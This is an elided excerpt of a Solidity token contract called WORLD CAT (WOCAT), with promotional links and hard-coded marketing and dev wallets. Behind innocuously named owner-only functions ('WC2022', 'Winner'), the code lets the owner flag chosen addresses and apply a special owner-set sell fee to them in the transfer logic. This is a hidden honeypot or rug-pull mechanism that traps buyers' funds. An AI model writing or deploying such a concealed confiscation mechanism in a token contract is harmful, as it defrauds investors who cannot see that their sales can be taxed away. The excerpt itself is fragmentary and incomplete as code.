...
//    https://t.me/WorldCatPortal
//    http://www.worldcat.finance/
...
contract WOCAT is Context, IERC20 { 
    ...
    mapping (address => bool) public _WC;
    address[] public _WC2022;

    address payable public Wallet_Marketing = payable(0x23e870F3803409F8a958f022F929E91FD369400F); 
    address payable public Wallet_Dev = payable(0x8d22dc55C37f0441336C7CdfEE6015F0088C44c2);
    ...
    string private constant _name = "WORLD CAT ";
    string private constant _symbol = unicode"WOCAT"; 
    ...
    function WC2022() external onlyOwner {
        for (uint256 i = 0; i < _WC2022.length; i++) {
            _WC[_WC2022[i]] = true;
        }
    }

    function Winner(address[] memory addrs)
        external
        onlyOwner
        returns (bool)
    {
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if (_WC[sender]) 
            _sellFEE = tAmount*_WC2022_f/100;            
